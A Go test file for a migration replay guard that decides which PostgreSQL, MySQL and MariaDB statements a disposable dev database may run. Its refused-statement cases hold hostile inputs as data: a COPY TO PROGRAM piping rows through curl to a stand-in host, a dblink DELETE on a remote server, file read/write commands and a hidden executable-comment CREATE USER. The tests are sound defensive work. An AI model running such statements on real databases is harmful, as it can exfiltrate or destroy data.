package devclean_test

import (
	"testing"

	qt "github.com/frankban/quicktest"

	"ptah.run/catalog"
	"ptah.run/core/platform"
	"ptah.run/internal/devclean"
)

// postgresServerWideStatements are refused on a server the operator named and
// accepted on one the run provisioned. Each reaches past the dev database into
// the rest of the server, and on a provisioned server the rest of the server is
// the run's own.
var postgresServerWideStatements = []struct {
	name      string
	statement string
}{
	{name: "DO block creating a role", statement: "DO $$\nBEGIN\n  IF NOT EXISTS (SELECT 1 FROM pg_roles WHERE rolname = 'app') THEN\n    CREATE ROLE app NOLOGIN;\n  END IF;\nEND\n$$"},
	{name: "CALL", statement: `CALL refresh_totals()`},
	{name: "CREATE FUNCTION", statement: `CREATE FUNCTION add_one(i integer) RETURNS integer LANGUAGE sql AS $$ SELECT i + 1 $$`},
	{name: "CREATE OR REPLACE FUNCTION", statement: `CREATE OR REPLACE FUNCTION add_one(i integer) RETURNS integer LANGUAGE sql AS $$ SELECT i + 1 $$`},
	{name: "CREATE PROCEDURE", statement: `CREATE PROCEDURE refresh_totals() LANGUAGE sql AS $$ SELECT 1 $$`},
	{name: "ALTER FUNCTION", statement: `ALTER FUNCTION add_one(integer) SECURITY DEFINER`},
	{name: "CREATE ROLE", statement: `CREATE ROLE app NOLOGIN NOSUPERUSER NOBYPASSRLS`},
	{name: "CREATE USER", statement: `CREATE USER reporter`},
	{name: "CREATE GROUP", statement: `CREATE GROUP readers`},
	{name: "ALTER ROLE attributes", statement: `ALTER ROLE app WITH LOGIN`},
	{name: "DROP ROLE", statement: `DROP ROLE IF EXISTS app`},
	{name: "CREATE DATABASE", statement: `CREATE DATABASE scratch`},
	{name: "role membership", statement: `GRANT app TO reporter`},
	{name: "schema privilege", statement: `GRANT USAGE ON SCHEMA public TO app`},
	{name: "database privilege", statement: `GRANT CONNECT ON DATABASE dev TO app`},
	{name: "revoked schema privilege", statement: `REVOKE ALL ON SCHEMA public FROM PUBLIC`},
	{name: "default privileges for all roles without a schema", statement: `ALTER DEFAULT PRIVILEGES FOR ALL ROLES GRANT SELECT, INSERT, UPDATE, DELETE ON TABLES TO app`},
	{name: "DROP OWNED", statement: `DROP OWNED BY app`},
	{name: "REASSIGN OWNED", statement: `REASSIGN OWNED BY app TO reporter`},
	{name: "COMMENT ON ROLE", statement: `COMMENT ON ROLE app IS 'the application role'`},
	{name: "COMMENT ON EXTENSION", statement: `COMMENT ON EXTENSION pgcrypto IS 'hashing'`},
	{name: "COMMENT ON SCHEMA", statement: `COMMENT ON SCHEMA app IS 'the application schema'`},
}

func postgresGuard(realm devclean.ReplayRealm) *devclean.ReplayGuard {
	return devclean.NewReplayGuard(catalog.ServerInfo{Dialect: platform.Postgres, Schema: "public"}, realm)
}

func TestReplayGuardServerRealm_PostgresLiftsServerWideStatements(t *testing.T) {
	guard := postgresGuard(devclean.ReplayRealmServer)
	for _, test := range postgresServerWideStatements {
		t.Run(test.name, func(t *testing.T) {
			c := qt.New(t)
			c.Assert(guard.ValidateStatement(test.statement), qt.IsNil)
		})
	}
}

// TestReplayGuardDatabaseRealm_PostgresRefusesServerWideStatements is the
// control for the test above: the same statements are refused on a server the
// operator named, so the realm is what lifted them.
func TestReplayGuardDatabaseRealm_PostgresRefusesServerWideStatements(t *testing.T) {
	guard := postgresGuard(devclean.ReplayRealmDatabase)
	for _, test := range postgresServerWideStatements {
		t.Run(test.name, func(t *testing.T) {
			c := qt.New(t)
			c.Assert(
				guard.ValidateStatement(test.statement),
				qt.ErrorMatches,
				`postgres migration replay rejects .* because its effects cannot be confined to the disposable database realm`,
			)
		})
	}
}

// TestReplayGuardServerRealm_PostgresFailurePath pins what a provisioned server
// still refuses. None of these is refused for the realm: each changes the
// replay session or the sessions the rest of the run opens, changes how the
// run's later SQL parses or runs, reaches past the container, or mutates the
// server's own catalogs.
func TestReplayGuardServerRealm_PostgresFailurePath(t *testing.T) {
	guard := postgresGuard(devclean.ReplayRealmServer)
	tests := []struct {
		name      string
		statement string
		wantErr   string
	}{
		{name: "role session default", statement: `ALTER ROLE app SET search_path TO app`, wantErr: `.*rejects ALTER ROLE .*`},
		{name: "role reset", statement: `ALTER ROLE ALL RESET ALL`, wantErr: `.*rejects ALTER ROLE .*`},
		{name: "database setting", statement: `ALTER DATABASE dev SET search_path TO app`, wantErr: `.*rejects ALTER DATABASE .*`},
		{name: "database rename", statement: `ALTER DATABASE dev RENAME TO other`, wantErr: `.*rejects ALTER DATABASE .*`},
		{name: "server configuration", statement: `ALTER SYSTEM SET work_mem = '64MB'`, wantErr: `.*rejects ALTER SYSTEM .*`},
		{name: "event trigger", statement: `CREATE EVENT TRIGGER audit ON ddl_command_end EXECUTE FUNCTION audit_ddl()`, wantErr: `.*rejects CREATE EVENT .*`},
		{name: "language", statement: `CREATE LANGUAGE plpython3u`, wantErr: `.*rejects CREATE LANGUAGE .*`},
		{name: "cast", statement: `CREATE CAST (text AS integer) WITH INOUT`, wantErr: `.*rejects CREATE CAST .*`},
		{name: "tablespace", statement: `CREATE TABLESPACE fast LOCATION '/mnt/fast'`, wantErr: `.*rejects CREATE TABLESPACE .*`},
		{name: "tablespace privilege", statement: `GRANT CREATE ON TABLESPACE fast TO app`, wantErr: `.*rejects GRANT database or global privilege .*`},
		{name: "subscription", statement: `CREATE SUBSCRIPTION sub CONNECTION 'host=prod' PUBLICATION pub`, wantErr: `.*rejects CREATE SUBSCRIPTION .*`},
		{name: "foreign server", statement: `CREATE SERVER prod FOREIGN DATA WRAPPER postgres_fdw`, wantErr: `.*rejects CREATE SERVER .*`},
		{name: "user mapping", statement: `CREATE USER MAPPING FOR app SERVER prod`, wantErr: `.*rejects CREATE USER because .*`},
		{name: "foreign schema import", statement: `IMPORT FOREIGN SCHEMA public FROM SERVER prod INTO staging`, wantErr: `.*rejects IMPORT FOREIGN SCHEMA .*`},
		{name: "dblink", statement: `SELECT dblink_exec('host=prod', 'DELETE FROM orders')`, wantErr: `.*rejects external dblink operation .*`},
		{name: "copy to a program", statement: `COPY orders TO PROGRAM 'curl -d @- https://example.test'`, wantErr: `.*rejects external COPY .*`},
		{name: "cluster control function", statement: `SELECT pg_terminate_backend(42)`, wantErr: `.*rejects cluster control function .*`},
		{name: "search path", statement: `SET search_path TO app`, wantErr: `.*rejects SET search_path .*`},
		{name: "transaction control", statement: `COMMIT`, wantErr: `.*rejects COMMIT session or transaction state .*`},
		{name: "temporary table", statement: `CREATE TEMP TABLE scratch (id integer)`, wantErr: `.*rejects TEMP object .*`},
		{name: "routine in a protected namespace", statement: `CREATE FUNCTION pg_catalog.add_one(i integer) RETURNS integer LANGUAGE sql AS $$ SELECT i + 1 $$`, wantErr: `.*rejects protected namespace "pg_catalog" mutation .*`},
		{name: "privilege on a protected schema", statement: `GRANT USAGE ON SCHEMA pg_catalog TO app`, wantErr: `.*rejects protected namespace "pg_catalog" mutation .*`},
		{name: "comment on a protected schema", statement: `COMMENT ON SCHEMA pg_catalog IS 'x'`, wantErr: `.*rejects protected namespace "pg_catalog" mutation .*`},
		{name: "comment on a language", statement: `COMMENT ON LANGUAGE plpgsql IS 'x'`, wantErr: `.*rejects COMMENT ON global metadata .*`},
		{name: "comment on a cast", statement: `COMMENT ON CAST (int AS text) IS 'x'`, wantErr: `.*rejects COMMENT ON global metadata .*`},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			c := qt.New(t)
			c.Assert(guard.ValidateStatement(test.statement), qt.ErrorMatches, test.wantErr)
		})
	}
}

// TestReplayGuardDatabaseRealm_PostgresAcceptsDefaultPrivileges replays the
// default privileges Ptah renders on a server the operator named. Each sets
// pg_default_acl rows of the dev database, which the realm cleanup revokes,
// or, for a global default, returns to the built-in one (stokaro/ptah#3772).
// FOR ROLE names a role without altering it.
func TestReplayGuardDatabaseRealm_PostgresAcceptsDefaultPrivileges(t *testing.T) {
	guard := postgresGuard(devclean.ReplayRealmDatabase)
	tests := []struct {
		name      string
		statement string
	}{
		{name: "in a schema", statement: `ALTER DEFAULT PRIVILEGES FOR ROLE "app_owner" IN SCHEMA "app" GRANT SELECT ON TABLES TO "app_reader"`},
		{name: "global grant", statement: `ALTER DEFAULT PRIVILEGES FOR ROLE "app_owner" GRANT USAGE ON SCHEMAS TO "app_reader"`},
		{name: "global revoke", statement: `ALTER DEFAULT PRIVILEGES FOR ROLE "app_owner" REVOKE EXECUTE ON FUNCTIONS FROM PUBLIC`},
		{name: "global, for the current role", statement: `ALTER DEFAULT PRIVILEGES GRANT SELECT ON TABLES TO "app_reader"`},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			c := qt.New(t)
			c.Assert(guard.ValidateStatement(test.statement), qt.IsNil)
		})
	}
}

// mysqlServerWideStatements are the MySQL and MariaDB counterpart of
// postgresServerWideStatements.
var mysqlServerWideStatements = []struct {
	name      string
	statement string
}{
	{name: "CREATE PROCEDURE", statement: "CREATE PROCEDURE refresh_totals() BEGIN SELECT 1; END"},
	{name: "CREATE FUNCTION with a definer", statement: "CREATE DEFINER = `root`@`%` FUNCTION add_one(i INT) RETURNS INT DETERMINISTIC RETURN i + 1"},
	{name: "CREATE TRIGGER", statement: "CREATE TRIGGER orders_touch BEFORE UPDATE ON orders FOR EACH ROW SET NEW.updated_at = NOW()"},
	{name: "ALTER PROCEDURE", statement: "ALTER PROCEDURE refresh_totals COMMENT 'nightly'"},
	{name: "CALL", statement: "CALL refresh_totals()"},
	{name: "CREATE USER", statement: "CREATE USER 'app'@'%' IDENTIFIED BY 'secret'"},
	{name: "DROP USER", statement: "DROP USER IF EXISTS 'app'@'%'"},
	{name: "CREATE ROLE", statement: "CREATE ROLE 'readers'"},
	{name: "GRANT", statement: "GRANT SELECT ON dev.* TO 'app'@'%'"},
	{name: "REVOKE", statement: "REVOKE INSERT ON dev.orders FROM 'app'@'%'"},
	{name: "CREATE DATABASE", statement: "CREATE DATABASE IF NOT EXISTS archive"},
	{name: "write in another database", statement: "CREATE TABLE archive.orders (id INT PRIMARY KEY)"},
}

func mysqlGuard(dialect string, realm devclean.ReplayRealm) *devclean.ReplayGuard {
	return devclean.NewReplayGuard(catalog.ServerInfo{Dialect: dialect, Schema: "dev"}, realm)
}

func TestReplayGuardServerRealm_MySQLLiftsServerWideStatements(t *testing.T) {
	for _, dialect := range []string{platform.MySQL, platform.MariaDB} {
		guard := mysqlGuard(dialect, devclean.ReplayRealmServer)
		for _, test := range mysqlServerWideStatements {
			t.Run(dialect+"/"+test.name, func(t *testing.T) {
				c := qt.New(t)
				c.Assert(guard.ValidateStatement(test.statement), qt.IsNil)
			})
		}
	}
}

// TestReplayGuardDatabaseRealm_MySQLRefusesServerWideStatements is the control
// for the test above.
func TestReplayGuardDatabaseRealm_MySQLRefusesServerWideStatements(t *testing.T) {
	for _, dialect := range []string{platform.MySQL, platform.MariaDB} {
		guard := mysqlGuard(dialect, devclean.ReplayRealmDatabase)
		for _, test := range mysqlServerWideStatements {
			t.Run(dialect+"/"+test.name, func(t *testing.T) {
				c := qt.New(t)
				c.Assert(
					guard.ValidateStatement(test.statement),
					qt.ErrorMatches,
					dialect+` migration replay rejects .* because its effects cannot be confined to the disposable database realm`,
				)
			})
		}
	}
}

// TestReplayGuardServerRealm_MySQLFailurePath pins what a provisioned MySQL or
// MariaDB server still refuses: a scheduled event runs during the rest of the
// run, and the others change the session, the server's configuration or the
// run's own credentials, or reach past the container.
func TestReplayGuardServerRealm_MySQLFailurePath(t *testing.T) {
	tests := []struct {
		name      string
		statement string
		wantErr   string
	}{
		{name: "scheduled event", statement: "CREATE EVENT purge ON SCHEDULE EVERY 1 MINUTE DO DELETE FROM orders", wantErr: `.*rejects CREATE executable stored body .*`},
		{name: "event with a definer", statement: "CREATE DEFINER = `root`@`%` EVENT purge ON SCHEDULE EVERY 1 MINUTE DO DELETE FROM orders", wantErr: `.*rejects CREATE executable stored body .*`},
		{name: "credential change", statement: "ALTER USER 'root'@'%' IDENTIFIED BY 'changed'", wantErr: `.*rejects ALTER USER .*`},
		{name: "session database", statement: "USE archive", wantErr: `.*rejects USE .*`},
		{name: "global setting", statement: "SET GLOBAL max_connections = 10", wantErr: `.*rejects global or persistent SET .*`},
		{name: "external data load", statement: "LOAD DATA INFILE '/tmp/orders.csv' INTO TABLE orders", wantErr: `.*rejects LOAD external data operation .*`},
		{name: "external file write", statement: "SELECT * FROM orders INTO OUTFILE '/tmp/orders.csv'", wantErr: `.*rejects external file operation .*`},
		{name: "federated table", statement: "CREATE TABLE remote_orders (id INT) ENGINE=FEDERATED CONNECTION='mysql://prod/orders'", wantErr: `.*rejects FEDERATED storage engine .*`},
		{name: "temporary table", statement: "CREATE TEMPORARY TABLE scratch (id INT)", wantErr: `.*rejects TEMP object .*`},
		{name: "executable comment", statement: "/*!50000 CREATE USER 'app'@'%' */", wantErr: `.*rejects executable comment .*`},
	}
	for _, dialect := range []string{platform.MySQL, platform.MariaDB} {
		guard := mysqlGuard(dialect, devclean.ReplayRealmServer)
		for _, test := range tests {
			t.Run(dialect+"/"+test.name, func(t *testing.T) {
				c := qt.New(t)
				c.Assert(guard.ValidateStatement(test.statement), qt.ErrorMatches, test.wantErr)
			})
		}
	}
}

// replayRemedy stands for the remedy a caller passes; the guard appends it as
// given.
const replayRemedy = "raise the realm"

// TestReplayGuardRemedy_EndsARefusalTheServerRealmLifts replays, on a server
// the operator named, the statements a provisioned server accepts. Each
// refusal ends with the remedy, because reaching the server realm would lift
// it.
func TestReplayGuardRemedy_EndsARefusalTheServerRealmLifts(t *testing.T) {
	for _, test := range postgresServerWideStatements {
		t.Run("postgres/"+test.name, func(t *testing.T) {
			c := qt.New(t)
			guard := postgresGuard(devclean.ReplayRealmDatabase).WithServerRealmRemedy(replayRemedy)
			c.Assert(guard.ValidateStatement(test.statement), qt.ErrorMatches,
				`postgres migration replay rejects .* because its effects cannot be confined to the disposable database realm; raise the realm`)
		})
	}
	for _, dialect := range []string{platform.MySQL, platform.MariaDB} {
		for _, test := range mysqlServerWideStatements {
			t.Run(dialect+"/"+test.name, func(t *testing.T) {
				c := qt.New(t)
				guard := mysqlGuard(dialect, devclean.ReplayRealmDatabase).WithServerRealmRemedy(replayRemedy)
				c.Assert(guard.ValidateStatement(test.statement), qt.ErrorMatches,
					dialect+` migration replay rejects .* because its effects cannot be confined to the disposable database realm; raise the realm`)
			})
		}
	}
}

// TestReplayGuardRemedy_EndsAWholeServerRefusalTheServerRealmLifts is the same
// for a MySQL or MariaDB dev URL that names no database. Its realm already
// lifts a database's creation and a write in another one; what it still
// refuses outlives the cleanup of the server's databases, and the server realm
// lifts it.
func TestReplayGuardRemedy_EndsAWholeServerRefusalTheServerRealmLifts(t *testing.T) {
	statements := []string{
		"CREATE USER 'app'@'%' IDENTIFIED BY 'secret'",
		"GRANT SELECT ON dev.* TO 'app'@'%'",
		"CREATE PROCEDURE refresh_totals() BEGIN SELECT 1; END",
		"CALL refresh_totals()",
	}
	for _, dialect := range []string{platform.MySQL, platform.MariaDB} {
		for _, statement := range statements {
			t.Run(dialect+"/"+statement, func(t *testing.T) {
				c := qt.New(t)
				guard := mysqlGuard(dialect, devclean.ReplayRealmServerDatabases).WithServerRealmRemedy(replayRemedy)
				c.Assert(guard.ValidateStatement(statement), qt.ErrorMatches,
					dialect+` migration replay rejects .* because its effects cannot be confined to the disposable database realm; raise the realm`)
			})
		}
	}
}

// TestReplayGuardRemedy_LeavesARefusalTheServerRealmKeeps pins the refusals
// that reaching the server realm would not lift. Each message ends where the
// guard's own does, so the remedy never points at a setting that does not
// help. The engines other than PostgreSQL and MySQL have one realm, and a
// guard for the server realm has nothing left to suggest.
func TestReplayGuardRemedy_LeavesARefusalTheServerRealmKeeps(t *testing.T) {
	tests := []struct {
		name      string
		dialect   string
		realm     devclean.ReplayRealm
		statement string
		wantErr   string
	}{
		{name: "server configuration", dialect: platform.Postgres, realm: devclean.ReplayRealmDatabase, statement: `ALTER SYSTEM SET work_mem = '64MB'`, wantErr: `postgres migration replay rejects ALTER SYSTEM because its effects cannot be confined to the disposable database realm`},
		{name: "search path", dialect: platform.Postgres, realm: devclean.ReplayRealmDatabase, statement: `SET search_path TO app`, wantErr: `postgres migration replay rejects SET search_path because its effects cannot be confined to the disposable database realm`},
		{name: "routine in a protected namespace", dialect: platform.Postgres, realm: devclean.ReplayRealmDatabase, statement: `CREATE FUNCTION pg_catalog.add_one(i integer) RETURNS integer LANGUAGE sql AS $$ SELECT i + 1 $$`, wantErr: `postgres migration replay rejects CREATE routine definition because its effects cannot be confined to the disposable database realm`},
		{name: "routine on a provisioned server", dialect: platform.Postgres, realm: devclean.ReplayRealmServer, statement: `CREATE FUNCTION pg_catalog.add_one(i integer) RETURNS integer LANGUAGE sql AS $$ SELECT i + 1 $$`, wantErr: `postgres migration replay rejects protected namespace "pg_catalog" mutation because its effects cannot be confined to the disposable database realm`},
		{name: "scheduled event", dialect: platform.MySQL, realm: devclean.ReplayRealmDatabase, statement: "CREATE EVENT purge ON SCHEDULE EVERY 1 MINUTE DO DELETE FROM orders", wantErr: `mysql migration replay rejects CREATE executable stored body because its effects cannot be confined to the disposable database realm`},
		{name: "executable comment", dialect: platform.MariaDB, realm: devclean.ReplayRealmServerDatabases, statement: "/*!50000 CREATE USER 'app'@'%' */", wantErr: `mariadb migration replay rejects executable comment because its effects cannot be confined to the disposable database realm`},
		{name: "SQL Server database", dialect: platform.SQLServer, realm: devclean.ReplayRealmDatabase, statement: `CREATE DATABASE scratch`, wantErr: `sqlserver migration replay rejects CREATE DATABASE because its effects cannot be confined to the disposable database realm`},
		{name: "SQLite attachment", dialect: platform.SQLite, realm: devclean.ReplayRealmDatabase, statement: `ATTACH DATABASE 'other.db' AS other`, wantErr: `sqlite migration replay rejects ATTACH because its effects cannot be confined to the disposable database realm`},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			c := qt.New(t)
			guard := devclean.NewReplayGuard(catalog.ServerInfo{Dialect: test.dialect, Schema: "dev"}, test.realm).
				WithServerRealmRemedy(replayRemedy)
			c.Assert(guard.ValidateStatement(test.statement), qt.ErrorMatches, test.wantErr)
		})
	}
}

// TestReplayGuardRemedy_AcceptsWhatTheRealmAccepts shows the remedy changes a
// refusal's message and nothing the guard accepts.
func TestReplayGuardRemedy_AcceptsWhatTheRealmAccepts(t *testing.T) {
	c := qt.New(t)
	guard := postgresGuard(devclean.ReplayRealmDatabase).WithServerRealmRemedy(replayRemedy)
	c.Assert(guard.ValidateStatement(`CREATE TABLE orders (id integer PRIMARY KEY)`), qt.IsNil)
}

// TestReplayGuardRemedy_LeavesTheGuardItCopies shows WithServerRealmRemedy
// returns a copy: the guard it was called on refuses as before.
func TestReplayGuardRemedy_LeavesTheGuardItCopies(t *testing.T) {
	c := qt.New(t)
	guard := postgresGuard(devclean.ReplayRealmDatabase)
	_ = guard.WithServerRealmRemedy(replayRemedy)
	c.Assert(guard.ValidateStatement(`CREATE ROLE app`), qt.ErrorMatches,
		`postgres migration replay rejects CREATE ROLE because its effects cannot be confined to the disposable database realm`)
}
